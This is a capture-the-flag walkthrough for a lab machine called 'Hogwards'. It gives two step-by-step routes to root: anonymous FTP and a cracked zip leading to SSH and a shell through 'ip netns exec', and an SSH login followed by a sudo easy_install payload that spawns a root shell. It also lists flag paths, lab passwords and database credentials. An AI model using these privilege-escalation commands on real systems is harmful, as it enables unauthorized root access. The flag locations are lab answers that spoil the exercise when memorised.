# Hogwards
## Method 1
1. `ftp hogwards.thm -p 7259` and anonymous *The FTP port is random, so you have to make nmap scan*
2. `get .I_saved_it_harry.zip`
3. `unzip .I_saved_it_harry.zip` passwod is:`qwer1234`
4. `ssh -l neville -p 9075 hogwards.thm`
5. `ip netns add foo`
6. `ip netns exec foo /bin/sh -p`
## Method 2
1. `ssh draco@hogwards.thm` password: `slytherin`
2. `TF=$(mktemp -d)`
3. `echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py`
4. `sudo easy_install $TF`


## Flags
1. /root/headmaster.txt
2. /home/hermoine/special_spell.txt
3. /home/harry/special_spell.txt
4./home/draco/achievements.txt
5. /var/www/mymainsite/conn.php
6. mysql db (root:neville_was_chosen), basement db, monsters table
7. /etc/left_corridor/seventh_floor/.entrance (thanks to mug3njutsu on discord for this)
